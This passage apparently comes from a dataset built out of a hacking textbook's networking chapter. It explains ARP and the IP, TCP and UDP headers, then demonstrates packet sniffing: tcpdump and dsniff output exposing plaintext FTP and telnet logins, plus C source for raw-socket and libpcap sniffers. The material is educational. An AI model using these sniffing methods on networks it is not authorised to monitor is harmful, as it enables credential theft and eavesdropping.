desk. In Ethernet,\nthe method is known as Address Resolution Protocol (ARP).\nThis protocol allows “seating charts” to be made to associate an IP address\nwith a piece of hardware. There are four different types of ARP messages, but\nthe two most important types are ARP request messages and ARP reply messages.\nAny packet’s Ethernet header includes a type value that describes the packet.\nThis type is used to specify whether the packet is an ARP-type message or an\nIP packet.\nAn ARP request is a message, sent to the broadcast address, that contains\nthe sender’s IP address and MAC address and basically says, “Hey, who has\nthis IP? If it’s you, please respond and tell me your MAC address.” An ARP\nreply is the corresponding response that is sent to the requester’s MAC address\n(and IP address) saying, “This is my MAC address, and I have this IP address.”\nMost implementations will temporarily cache the MAC/IP address pairs\nreceived in ARP replies, so that ARP requests and replies aren’t needed for\nevery single packet. These caches are like the interoffice seating chart.\nFor example, if one system has the IP address 10.10.10.20 and MAC\naddress 00:00:00:aa:aa:aa, and another system on the same network has\ntheIP address 10.10.10.50 and MAC address 00:00:00:bb:bb:bb, neither\nsystem can communicate with the other until they know each other’s MAC\naddresses.\nARP request\nSource MAC: 00:00:00:aa:aa:aa\nDest MAC: ff:ff:ff:ff:ff:ff\n“Who has 10.10.10.50?”\nFirst system Second system\nIP: 10.10.10.20 IP: 10.10.10.50\nMAC: 00:00:00:aa:aa:aa MAC: 00:00:00:bb:bb:bb\nARP reply\nSource MAC: 00:00:00:bb:bb:bb\nDest MAC: 00:00:00:aa:aa:aa\n“10.10.10.50 is at 00:00:00:bb:bb:bb.”\nIf the first system wants to establish a TCP connection over IP to the\nsecond device’s IP address of 10.10.10.50, the first system will first check its\nARP cache to see if an entry exists for 10.10.10.50. Since this is the first time\nthese two systems are trying to communicate, there will be no such entry, and\nan ARP request will be sent out to the broadcast address, saying, “If you are\n10.10.10.50, please respond to me at 00:00:00:aa:aa:aa.” Since this request\nuses the broadcast address, every system on the network sees the request, but\nonly the system with the corresponding IP address is meant to respond. In this\ncase, the second system responds with an ARP reply that is sent directly back\nto 00:00:00:aa:aa:aa saying, “I am 10.10.10.50 and I’m at 00:00:00:bb:bb:bb.”\nThe first system receives this reply, caches the IP and MAC address pair in its\nARP cache, and uses the hardware address to communicate.\nNetworking 219"
  },
  {
    "input": "0x432 Network Layer",
    "output": "0x432 Network Layer\nThe network layer is like a worldwide postal service providing an addressing\nand delivery method used to send things everywhere. The protocol used at\nthis layer for Internet addressing and delivery is, appropriately, called Internet\nProtocol (IP); the majority of the Internet uses IP version 4.\nEvery system on the Internet has an IP address, consisting of a familiar\nfour-byte arrangement in the form of xx.xx.xx.xx. The IP header for packets\nin this layer is 20 bytes in size and consists of various fields and bitflags as\ndefined in RFC 791.\nFrom RFC 791\n[Page 10]\nSeptember 1981\nInternet Protocol\n3. SPECIFICATION\n3.1. Internet Header Format\nA summary of the contents of the internet header follows:\n0 1 2 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|Version| IHL |Type of Service| Total Length |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Identification |Flags| Fragment Offset |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Time to Live | Protocol | Header Checksum |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Source Address |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Destination Address |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Options | Padding |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nExample Internet Datagram Header\nFigure 4.\nNote that each tick mark represents one bit position.\nThis surprisingly descriptive ASCII diagram shows these fields and their\npositions in the header. Standard protocols have awesome documentation.\nSimilar to the Ethernet header, the IP header also has a protocol field to\ndescribe the type of data in the packet and the source and destination\naddresses for routing. In addition, the header carries a checksum, to help\ndetect transmission errors, and fields to deal with packet fragmentation.\nThe Internet Protocol is mostly used to transmit packets wrapped in\nhigher layers. However, Internet Control Message Protocol (ICMP) packets\n220 0x400"
  },
  {
    "input": "0x433 Transport Layer",
    "output": "also exist on this layer. ICMP packets are used for messaging and diagnostics.\nIP is less reliable than the post office—there’s no guarantee that an IP packet\nwill actually reach its final destination. If there’s a problem, an ICMP packet\nis sent back to notify the sender of the problem.\nICMP is also commonly used to test for connectivity. ICMP Echo Request\nand Echo Reply messages are used by a utility called ping. If one host wants\nto test whether it can route traffic to another host, it pings the remote host by\nsending an ICMP Echo Request. Upon receipt of the ICMP Echo Request, the\nremote host sends back an ICMP Echo Reply. These messages can be used\ntodetermine the connection latency between the two hosts. However, it is\nimportant to remember that ICMP and IP are both connectionless; all this\nprotocol layer really cares about is getting the packet to its destination address.\nSometimes a network link will have a limitation on packet size, disallowing\nthe transfer of large packets. IP can deal with this situation by fragmenting\npackets, as shown here.\nLarge IP packet\nHeader Data Data continued More data\nPacket fragments\nHeader Data\nHeader Data continued\nHeader More data\nThe packet is broken up into smaller packet fragments that can pass\nthrough the network link, IP headers are put on each fragment, and they’re\nsent off. Each fragment has a different fragment offset value, which is stored\nin the header. When the destination receives these fragments, the offset\nvalues are used to reassemble the original IP packet.\nProvisions such as fragmentation aid in the delivery of IP packets, but\nthis does nothing to maintain connections or ensure delivery. This is the job\nof the protocols at the transport layer.\n0x433 Transport Layer\nThe transport layer can be thought of as the first line of office receptionists,\npicking up the mail from the network layer. If a customer wants to return a\ndefective piece of merchandise, they send a message requesting a Return\nMaterial Authorization (RMA) number. Then the receptionist would follow\nthe return protocol by asking for a receipt and eventually issuing an RMA\nnumber so the customer can mail the product in. The post office is only\nconcerned with sending these messages (and packages) back and forth, not\nwith what’s in them.\nNetworking 221\nThe two major protocols at this layer are the Transmission Control\nProtocol (TCP) and User Datagram Protocol (UDP). TCP is the most\ncommonly used protocol for services on the Internet: telnet, HTTP (web\ntraffic), SMTP (email traffic), and FTP (file transfers) all use TCP. One of\nthe reasons for TCP’s popularity is that it provides a transparent, yet reliable\nand bidirectional, connection between two IP addresses. Stream sockets use\nTCP/IP connections. A bidirectional connection with TCP is similar to using\na telephone—after dialing a number, a connection is made through which\nboth parties can communicate. Reliability simply means that TCP will ensure\nthat all the data will reach its destination in the proper order. If the packets\nof a connection get jumbled up and arrive out of order, TCP will make sure\nthey’re put back in order before handing the data up to the next layer. If\nsome packets in the middle of a connection are lost, the destination will hold\non to the packets it has while the source retransmits the missing packets.\nAll of this functionality is made possible by a set of flags, called TCP flags,\nand by tracking values called sequence numbers. The TCP flags are as follows:\nTCP flag Meaning Purpose\nURG Urgent Identifies important data\nACK Acknowledgment Acknowledges a packet; it is turned on for the majority of the\nconnection\nPSH Push Tells the receiver to push the data through instead of buffering it\nRST Reset Resets a connection\nSYN Synchronize Synchronizes sequence numbers at the beginning of a connection\nFIN Finish Gracefully closes a connection when both sides say goodbye\nThese flags are stored in the TCP header along with the source and\ndestination ports. The TCP header is specified in RFC 793.\nFrom RFC 793\n[Page 14]\nSeptember 1981\nTransmission Control Protocol\n3. FUNCTIONAL SPECIFICATION\n3.1. Header Format\nTCP segments are sent as internet datagrams. The Internet Protocol\nheader carries several information fields, including the source and\ndestination host addresses [2]. A TCP header follows the internet\nheader, supplying information specific to the TCP protocol. This\ndivision allows for the existence of host level protocols other than\nTCP.\nTCP Header Format\n222 0x400\n0 1 2 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Source Port | Destination Port |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Sequence Number |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Acknowledgment Number |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Data | |U|A|P|R|S|F| |\n| Offset| Reserved |R|C|S|S|Y|I| Window |\n| | |G|K|H|T|N|N| |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Checksum | Urgent Pointer |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| Options | Padding |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n| data |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\nTCP Header Format\nNote that one tick mark represents one bit position.\nFigure 3.\nThe sequence number and acknowledgment number are used to maintain\nstate. The SYN and ACK flags are used together to open connections in a\nthree-step handshaking process. When a client wants to open a connection\nwith a server, a packet with the SYN flag on, but the ACK flag off, is sent to\nthe server. The server then responds with a packet that has both the SYN and\nACK flags turned on. To complete the connection, the client sends back a\npacket with the SYN flag off but the ACK flag on. After that, every packet in\nthe connection will have the ACK flag turned on and the SYN flag turned off.\nOnly the first two packets of the connection have the SYN flag on, since those\npackets are used to synchronize sequence numbers.\nSYN packet\nSYN on ACK off\nseq # = 324808530\nack # = 0\nSYN/ACK packet\nClient SYN on ACK on Server\nseq # = 288666267\nack # = 324808531\nACK packet\nSYN off ACK on\nseq # = 324808531\nack # = 288666268\nNetworking 223"
  },
  {
    "input": "0x440 Network Sniffing",
    "output": "Sequence numbers allow TCP to put unordered packets back into order,\nto determine whether packets are missing, and to prevent mixing up packets\nfrom other connections.\nWhen a connection is initiated, each side generates an initial sequence\nnumber. This number is communicated to the other side in the first two SYN\npackets of the connection handshake. Then, with each packet that is sent,\nthe sequence number is incremented by the number of bytes found in the\ndata portion of the packet. This sequence number is included in the TCP\npacket header. In addition, each TCP header has an acknowledgment number,\nwhich is simply the other side’s sequence number plus one.\nTCP is great for applications where reliability and bidirectional communi-\ncation are needed. However, the cost of this functionality is paid in commu-\nnication overhead.\nUDP has much less overhead and built-in functionality than TCP. This\nlack of functionality makes it behave much like the IP protocol: It is connec-\ntionless and unreliable. Without built-in functionality to create connections\nand maintain reliability, UDP is an alternative that expects the application to\ndeal with these issues. Sometimes connections aren’t needed, and the light-\nweight UDP is a much better protocol for these situations. The UDP header,\ndefined in RFC 768, is relatively tiny. It only contains four 16-bit values in this\norder: source port, destination port, length, and checksum.\n0x440 Network Sniffing\nOn the data-link layer lies the distinction between switched and unswitched\nnetworks. On an unswitched network, Ethernet packets pass through every\ndevice on the network, expecting each system device to only look at the\npackets sent to its destination address. However, it’s fairly trivial to set a\ndevice to promiscuous mode, which causes it to look at all packets, regardless\nofthe destination address. Most packet-capturing programs, such as tcpdump,\ndrop the device they are listening to into promiscuous mode by default. Pro-\nmiscuous mode can be set using ifconfig, as seen in the following output.\nreader@hacking:~/booksrc $ ifconfig eth0\neth0 Link encap:Ethernet HWaddr 00:0C:29:34:61:65\nUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\nRX packets:17115 errors:0 dropped:0 overruns:0 frame:0\nTX packets:1927 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:4602913 (4.3 MiB) TX bytes:434449 (424.2 KiB)\nInterrupt:16 Base address:0x2024\nreader@hacking:~/booksrc $ sudo ifconfig eth0 promisc\nreader@hacking:~/booksrc $ ifconfig eth0\neth0 Link encap:Ethernet HWaddr 00:0C:29:34:61:65\nUP BROADCAST RUNNING PROMISC MULTICAST MTU:1500 Metric:1\nRX packets:17181 errors:0 dropped:0 overruns:0 frame:0\nTX packets:1927 errors:0 dropped:0 overruns:0 carrier:0\ncollisions:0 txqueuelen:1000\nRX bytes:4668475 (4.4 MiB) TX bytes:434449 (424.2 KiB)\n224 0x400\nInterrupt:16 Base address:0x2024\nreader@hacking:~/booksrc $\nThe act of capturing packets that aren’t necessarily meant for public view-\ning is called sniffing. Sniffing packets in promiscuous mode on an unswitched\nnetwork can turn up all sorts of useful information, as the following output\nshows.\nreader@hacking:~/booksrc $ sudo tcpdump -l -X 'ip host 192.168.0.118'\ntcpdump: listening on eth0\n21:27:44.684964 192.168.0.118.ftp > 192.168.0.193.32778: P 1:42(41) ack 1 win\n17316 <nop,nop,timestamp 466808 920202> (DF)\n0x0000 4500 005d e065 4000 8006 97ad c0a8 0076 E..].e@........v\n0x0010 c0a8 00c1 0015 800a 292e 8a73 5ed4 9ce8 ........)..s^...\n0x0020 8018 43a4 a12f 0000 0101 080a 0007 1f78 ..C../.........x\n0x0030 000e 0a8a 3232 3020 5459 5053 6f66 7420 ....220.TYPSoft.\n0x0040 4654 5020 5365 7276 6572 2030 2e39 392e FTP.Server.0.99.\n0x0050 3133 13\n21:27:44.685132 192.168.0.193.32778 > 192.168.0.118.ftp: . ack 42 win 5840\n<nop,nop,timestamp 920662 466808> (DF) [tos 0x10]\n0x0000 4510 0034 966f 4000 4006 21bd c0a8 00c1 E..4.o@.@.!.....\n0x0010 c0a8 0076 800a 0015 5ed4 9ce8 292e 8a9c ...v....^...)...\n0x0020 8010 16d0 81db 0000 0101 080a 000e 0c56 ...............V\n0x0030 0007 1f78 ...x\n21:27:52.406177 192.168.0.193.32778 > 192.168.0.118.ftp: P 1:13(12) ack 42 win\n5840 <nop,nop,timestamp 921434 466808> (DF) [tos 0x10]\n0x0000 4510 0040 9670 4000 4006 21b0 c0a8 00c1 E..@.p@.@.!.....\n0x0010 c0a8 0076 800a 0015 5ed4 9ce8 292e 8a9c ...v....^...)...\n0x0020 8018 16d0 edd9 0000 0101 080a 000e 0f5a ...............Z\n0x0030 0007 1f78 5553 4552 206c 6565 6368 0d0a ...xUSER.leech..\n21:27:52.415487 192.168.0.118.ftp > 192.168.0.193.32778: P 42:76(34) ack 13\nwin 17304 <nop,nop,timestamp 466885 921434> (DF)\n0x0000 4500 0056 e0ac 4000 8006 976d c0a8 0076 E..V..@....m...v\n0x0010 c0a8 00c1 0015 800a 292e 8a9c 5ed4 9cf4 ........)...^...\n0x0020 8018 4398 4e2c 0000 0101 080a 0007 1fc5 ..C.N,..........\n0x0030 000e 0f5a 3333 3120 5061 7373 776f 7264 ...Z331.Password\n0x0040 2072 6571 7569 7265 6420 666f 7220 6c65 .required.for.le\n0x0050 6563 ec\n21:27:52.415832 192.168.0.193.32778 > 192.168.0.118.ftp: . ack 76 win 5840\n<nop,nop,timestamp 921435 466885> (DF) [tos 0x10]\n0x0000 4510 0034 9671 4000 4006 21bb c0a8 00c1 E..4.q@.@.!.....\n0x0010 c0a8 0076 800a 0015 5ed4 9cf4 292e 8abe ...v....^...)...\n0x0020 8010 16d0 7e5b 0000 0101 080a 000e 0f5b ....~[.........[\n0x0030 0007 1fc5 ....\n21:27:56.155458 192.168.0.193.32778 > 192.168.0.118.ftp: P 13:27(14) ack 76\nwin 5840 <nop,nop,timestamp 921809 466885> (DF) [tos 0x10]\n0x0000 4510 0042 9672 4000 4006 21ac c0a8 00c1 E..B.r@.@.!.....\n0x0010 c0a8 0076 800a 0015 5ed4 9cf4 292e 8abe ...v....^...)...\n0x0020 8018 16d0 90b5 0000 0101 080a 000e 10d1 ................\n0x0030 0007 1fc5 5041 5353 206c 3840 6e69 7465 ....PASS.l8@nite\n0x0040 0d0a ..\n21:27:56.179427 192.168.0.118.ftp > 192.168.0.193.32778: P 76:103(27) ack 27\nwin 17290 <nop,nop,timestamp 466923 921809> (DF)\n0x0000 4500 004f e0cc 4000 8006 9754 c0a8 0076 E..O..@....T...v\n0x0010 c0a8 00c1 0015 800a 292e 8abe 5ed4 9d02 ........)...^...\nNetworking 225"
  },
  {
    "input": "0x441 Raw Socket Sniffer",
    "output": "0x0020 8018 438a 4c8c 0000 0101 080a 0007 1feb ..C.L...........\n0x0030 000e 10d1 3233 3020 5573 6572 206c 6565 ....230.User.lee\n0x0040 6368 206c 6f67 6765 6420 696e 2e0d 0a ch.logged.in...\nData transmitted over the network by services such as telnet, FTP, and\nPOP3 is unencrypted. In the preceding example, the user leech is seen logging\ninto an FTP server using the password l8@nite. Since the authentication pro-\ncess during login is also unencrypted, usernames and passwords are simply\ncontained in the data portions of the transmitted packets.\ntcpdump is a wonderful, general-purpose packet sniffer, but there are\nspecialized sniffing tools designed specifically to search for usernames and\npasswords. One notable example is Dug Song’s program, dsniff, which is\nsmart enough to parse out data that looks important.\nreader@hacking:~/booksrc $ sudo dsniff -n\ndsniff: listening on eth0\n-----------------\n12/10/02 21:43:21 tcp 192.168.0.193.32782 -> 192.168.0.118.21 (ftp)\nUSER leech\nPASS l8@nite\n-----------------\n12/10/02 21:47:49 tcp 192.168.0.193.32785 -> 192.168.0.120.23 (telnet)\nUSER root\nPASS 5eCr3t\n0x441 Raw Socket Sniffer\nSo far in our code examples, we have been using stream sockets. When\nsending and receiving using stream sockets, the data is neatly wrapped in a\nTCP/IP connection. Accessing the OSI model of the session (5) layer, the\noperating system takes care of all of the lower-level details of transmission,\ncorrection, and routing. It is possible to access the network at lower layers\nusing raw sockets. At this lower layer, all the details are exposed and must be\nhandled explicitly by the programmer. Raw sockets are specified by using\nSOCK_RAW as the type. In this case, the protocol matters since there are multiple\noptions. The protocol can be IPPROTO_TCP, IPPROTO_UDP, or IPPROTO_ICMP. The\nfollowing example is a TCP sniffing program using raw sockets.\nraw_tcpsniff.c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"hacking.h\"\nint main(void) {\nint i, recv_length, sockfd;\n226 0x400\nu_char buffer[9000];\nif ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)\nfatal(\"in socket\");\nfor(i=0; i < 3; i++) {\nrecv_length = recv(sockfd, buffer, 8000, 0);\nprintf(\"Got a %d byte packet\\n\", recv_length);\ndump(buffer, recv_length);\n}\n}\nThis program opens a raw TCP socket and listens for three packets, print-\ning the raw data of each one with the dump() function. Notice that buffer is\ndeclared as a u_char variable. This is just a convenience type definition from\nsys/socket.h that expands to “unsigned char.” This is for convenience, since\nunsigned variables are used a lot in network programming and typing\nunsigned every time is a pain.\nWhen compiled, the program needs to be run as root, because the use\nofraw sockets requires root access. The following output shows the program\nsniffing the network while we’re sending sample text to our simple_server.\nreader@hacking:~/booksrc $ gcc -o raw_tcpsniff raw_tcpsniff.c\nreader@hacking:~/booksrc $ ./raw_tcpsniff\n[!!] Fatal Error in socket: Operation not permitted\nreader@hacking:~/booksrc $ sudo ./raw_tcpsniff\nGot a 68 byte packet\n45 10 00 44 1e 36 40 00 40 06 46 23 c0 a8 2a 01 | E..D.6@.@.F#..*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf 92 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 32 47 00 00 01 01 08 0a 26 ab 9a f1 | ....2G......&...\n02 3b 65 b7 74 68 69 73 20 69 73 20 61 20 74 65 | .;e.this is a te\n73 74 0d 0a | st..\nGot a 70 byte packet\n45 10 00 46 1e 37 40 00 40 06 46 20 c0 a8 2a 01 | E..F.7@.@.F ..*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf a2 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 27 95 00 00 01 01 08 0a 26 ab a0 75 | ....'.......&..u\n02 3c 1b 28 41 41 41 41 41 41 41 41 41 41 41 41 | .<.(AAAAAAAAAAAA\n41 41 41 41 0d 0a | AAAA..\nGot a 71 byte packet\n45 10 00 47 1e 38 40 00 40 06 46 1e c0 a8 2a 01 | E..G.8@.@.F...*.\nc0 a8 2a f9 8b 12 1e d2 ac 14 cf b4 e5 10 6c c9 | ..*...........l.\n80 18 05 b4 68 45 00 00 01 01 08 0a 26 ab b6 e7 | ....hE......&...\n02 3c 20 ad 66 6a 73 64 61 6c 6b 66 6a 61 73 6b | .< .fjsdalkfjask\n66 6a 61 73 64 0d 0a | fjasd..\nreader@hacking:~/booksrc $\nWhile this program will capture packets, it isn’t reliable and will miss\nsome packets, especially when there is a lot of traffic. Also, it only captures\nTCP packets—to capture UDP or ICMP packets, additional raw sockets need\nto be opened for each. Another big problem with raw sockets is that they are\nnotoriously inconsistent between systems. Raw socket code for Linux most\nlikely won’t work on BSD or Solaris. This makes multiplatform programming\nwith raw sockets nearly impossible.\nNetworking 227"
  },
  {
    "input": "0x442 libpcap Sniffer",
    "output": "0x442 libpcap Sniffer\nA standardized programming library called libpcap can be used to smooth\nout the inconsistencies of raw sockets. The functions in this library still use\nraw sockets to do their magic, but the library knows how to correctly work\nwith raw sockets on multiple architectures. Both tcpdump and dsniff use\nlibpcap, which allows them to compile with relative ease on any platform.\nLet’s rewrite the raw packet sniffer program using the libpcap’s functions\ninstead of our own. These functions are quite intuitive, so we will discuss\nthem using the following code listing.\npcap_sniff.c\n#include <pcap.h>\n#include \"hacking.h\"\nvoid pcap_fatal(const char *failed_in, const char *errbuf) {\nprintf(\"Fatal Error in %s: %s\\n\", failed_in, errbuf);\nexit(1);\n}\nFirst, pcap.h is included providing various structures and defines used by\nthe pcap functions. Also, I’ve written a pcap_fatal() function for displaying\nfatal errors. The pcap functions use a error buffer to return error and status\nmessages, so this function is designed to display this buffer to the user.\nint main() {\nstruct pcap_pkthdr header;\nconst u_char *packet;\nchar errbuf[PCAP_ERRBUF_SIZE];\nchar *device;\npcap_t *pcap_handle;\nint i;\nThe errbuf variable is the aforementioned error buffer, its size coming\nfrom a define in pcap.h set to 256. The header variable is a pcap_pkthdr structure\ncontaining extra capture information about the packet, such as when it was\ncaptured and its length. The pcap_handle pointer works similarly to a file\ndescriptor, but is used to reference a packet-capturing object.\ndevice = pcap_lookupdev(errbuf);\nif(device == NULL)\npcap_fatal(\"pcap_lookupdev\", errbuf);\nprintf(\"Sniffing on device %s\\n\", device);\nThe pcap_lookupdev() function looks for a suitable device to sniff on. This\ndevice is returned as a string pointer referencing static function memory. For\nour system this will always be /dev/eth0, although it will be different on a BSD\nsystem. If the function can’t find a suitable interface, it will return NULL.\n228 0x400\npcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);\nif(pcap_handle == NULL)\npcap_fatal(\"pcap_open_live\", errbuf);\nSimilar to the socket function and file open function, the pcap_open_live()\nfunction opens a packet-capturing device, returning a handle to it. The argu-\nments for this function are the device to sniff, the maximum packet size, a\npromiscuous flag, a timeout value, and a pointer to the error buffer. Since we\nwant to capture in promiscuous mode, the promiscuous flag is set to 1.\nfor(i=0; i < 3; i++) {\npacket = pcap_next(pcap_handle, &header);\nprintf(\"Got a %d byte packet\\n\", header.len);\ndump(packet, header.len);\n}\npcap_close(pcap_handle);\n}\nFinally, the packet capture loop uses pcap_next() to grab the next packet.\nThis function is passed the pcap_handle and a pointer to a pcap_pkthdr struc-\nture so it can fill it with details of the capture. The function returns a pointer\nto the packet and then prints the packet, getting the length from the capture\nheader. Then pcap_close() closes the capture interface.\nWhen this program is compiled, the pcap libraries must be linked. This\ncan be done using the -l flag with GCC, as shown in the output below. The\npcap library has been installed on this system, so the library and include files\nare already in standard locations the compiler knows about.\nreader@hacking:~/booksrc $ gcc -o pcap_sniff pcap_sniff.c\n/tmp/ccYgieqx.o: In function `main':\npcap_sniff.c:(.text+0x1c8): undefined reference to `pcap_lookupdev'\npcap_sniff.c:(.text+0x233): undefined reference to `pcap_open_live'\npcap_sniff.c:(.text+0x282): undefined reference to `pcap_next'\npcap_sniff.c:(.text+0x2c2): undefined reference to `pcap_close'\ncollect2: ld returned 1 exit status\nreader@hacking:~/booksrc $ gcc -o pcap_sniff pcap_sniff.c -l pcap\nreader@hacking:~/booksrc $ ./pcap_sniff\nFatal Error in pcap_lookupdev: no suitable device found\nreader@hacking:~/booksrc $ sudo ./pcap_sniff\nSniffing on device eth0\nGot a 82 byte packet\n00 01 6c eb 1d 50 00 01 29 15 65 b6 08 00 45 10 | ..l..P..).e...E.\n00 44 1e 39 40 00 40 06 46 20 c0 a8 2a 01 c0 a8 | .D.9@.@.F ..*...\n2a f9 8b 12 1e d2 ac 14 cf c7 e5 10 6c c9 80 18 | *...........l...\n05 b4 54 1a 00 00 01 01 08 0a 26 b6 a7 76 02 3c | ..T.......&..v.<\n37 1e 74 68 69 73 20 69 73 20 61 20 74 65 73 74 | 7.this is a test\n0d 0a | ..\nGot a 66 byte packet\n00 01 29 15 65 b6 00 01 6c eb 1d 50 08 00 45 00 | ..).e...l..P..E.\n00 34 3d 2c 40 00 40 06 27 4d c0 a8 2a f9 c0 a8 | .4=,@.@.'M..*...\n2a 01 1e d2 8b 12 e5 10 6c c9 ac 14 cf d7 80 10 | *.......l.......\nNetworking 229"
  },
  {
    "input": "0x443 Decoding the Layers",
    "output": "05 a8 2b 3f 00 00 01 01 08 0a 02 47 27 6c 26 b6 | ..+?.......G'l&.\na7 76 | .v\nGot a 84 byte packet\n00 01 6c eb 1d 50 00 01 29 15 65 b6 08 00 45 10 | ..l..P..).e...E.\n00 46 1e 3a 40 00 40 06 46 1d c0 a8 2a 01 c0 a8 | .F.:@.@.F...*...\n2a f9 8b 12 1e d2 ac 14 cf d7 e5 10 6c c9 80 18 | *...........l...\n05 b4 11 b3 00 00 01 01 08 0a 26 b6 a9 c8 02 47 | ..........&....G\n27 6c 41 41 41 41 41 41 41 41 41 41 41 41 41 41 | 'lAAAAAAAAAAAAAA\n41 41 0d 0a | AA..\nreader@hacking:~/booksrc $\nNotice that there are many bytes preceding the sample text in the packet\nand many of these bytes are similar. Since these are raw packet captures, most\nof these bytes are layers of header information for Ethernet, IP, and TCP.\n0x443 Decoding the Layers\nIn our packet captures, the outermost layer is Ethernet, which is also the\nlowest visible layer. This layer is used to send data between Ethernet end-\npoints with MAC addresses. The header for this layer contains the source\nMAC address, the destination MAC address, and a 16-bit value that describes\nthe type of Ethernet packet. On Linux, the structure for this header is defined\nin /usr/include/linux/if_ethernet.h and the structures for the IP header and\nTCP header are located in /usr/include/netinet/ip.h and /usr/include/\nnetinet/tcp.h, respectively. The source code for tcpdump also has structures\nfor these headers, or we could just create our own header structures based\non the RFCs. A better understanding can be gained from writing our own\nstructures, so let’s use the structure definitions as guidance to create our\nown packet header structures to include in hacking-network.h.\nFirst, let’s look at the existing definition of the Ethernet header.\nFrom /usr/include/if_ether.h\n#define ETH_ALEN 6 /* Octets in one ethernet addr */\n#define ETH_HLEN 14 /* Total octets in header */\n/*\n* This is an Ethernet frame header.\n*/\nstruct ethhdr {\nunsigned char h_dest[ETH_ALEN]; /* Destination eth addr */\nunsigned char h_source[ETH_ALEN]; /* Source ether addr */\n__be16 h_proto; /* Packet type ID field */\n} __attribute__((packed));\nThis structure contains the three elements of an Ethernet header. The\nvariable declaration of __be16 turns out to be a type definition for a 16-bit\nunsigned short integer. This can be determined by recursively grepping for\nthe type definition in the include files.\n230 0x400\nreader@hacking:~/booksrc $\n$ grep -R \"typedef.*__be16\" /usr/include\n/usr/include/linux/types.h:typedef __u16 __bitwise __be16;\n$ grep -R \"typedef.*__u16\" /usr/include | grep short\n/usr/include/linux/i2o-dev.h:typedef unsigned short __u16;\n/usr/include/linux/cramfs_fs.h:typedef unsigned short __u16;\n/usr/include/asm/types.h:typedef unsigned short __u16;\n$\nThe include file also defines the Ethernet header length in ETH_HLEN as\n14bytes. This adds up, since the source and destination MAC addresses use\n6 bytes each, and the packet type field is a 16-bit short integer that takes up\n2bytes. However, many compilers will pad structures along 4-byte boundaries\nfor alignment, which means that sizeof(struct ethhdr) would return an\nincorrect size. To avoid this, ETH_HLEN or a fixed value of 14 bytes should\nbeused for the Ethernet header length.\nBy including <linux/if_ether.h>, these other include files containing\nthe required __be16 type definition are also included. Since we want to make\nour own structures for hacking-network.h, we should strip out references to\nunknown type definitions. While we’re at it, let’s give these fields better names.\nAdded to hacking-network.h\n#define ETHER_ADDR_LEN 6\n#define ETHER_HDR_LEN 14\nstruct ether_hdr {\nunsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\nunsigned char ether_src_addr[ETHER_ADDR_LEN]; // Source MAC address\nunsigned short ether_type; // Type of Ethernet packet\n};\nWe can do the same thing with the IP and TCP structures, using the\ncorresponding structures and RFC diagrams as a reference.\nFrom /usr/include/netinet/ip.h\nstruct iphdr\n{\n#if __BYTE_ORDER == __LITTLE_ENDIAN\nunsigned int ihl:4;\nunsigned int version:4;\n#elif __BYTE_ORDER == __BIG_ENDIAN\nunsigned int version:4;\nunsigned int ihl:4;\n#else\n# error \"Please fix <bits/endian.h>\"\n#endif\nu_int8_t tos;\nu_int16_t tot_len;\nu_int16_t id;\nNetworking 231\nu_int16_t frag_off;\nu_int8_t ttl;\nu_int8_t protocol;\nu_int16_t check;\nu_int32_t saddr;\nu_int32_t daddr;\n/*The options start here. */\n};\nFrom RFC 791\n0 1 2 3\n0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|Version| IHL |Type of Service| Total Length 